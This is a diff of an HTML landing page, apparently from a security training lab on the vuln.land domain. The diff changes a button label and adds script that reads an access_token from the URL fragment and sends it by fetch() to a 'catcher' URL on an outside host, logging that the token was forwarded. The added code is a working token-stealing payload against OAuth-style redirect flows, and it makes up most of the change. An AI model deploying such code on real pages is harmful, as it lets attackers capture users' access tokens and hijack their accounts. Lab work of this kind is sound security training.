@@ -11,7 +11,7 @@
 <body>
     <h1>Landing</h1>
     <button id="btn">
-        click me
+        click me!!!
     </button>
     <script>
         const btn = document.getElementById('btn')
@@ -30,6 +30,16 @@
             console.log('about to redirect to: ' + url);
             document.location.href = url;
         } 
+
+        const hash = new URLSearchParams(window.location.hash.substr(1));
+        const token = hash.get("access_token");
+        if(token && token.length > 0){
+            const catcherUrl = "https://b689f99a-99cc-4812-a9d6-b2afdb4b3a1d.idocker.vuln.land/"
+            fetch(catcherUrl + "&access_token_forwarded=" + token)
+            console.log('token ' + token +' forwareded to reqeust capture');
+        }
+
+
     </script>
 </body>
 
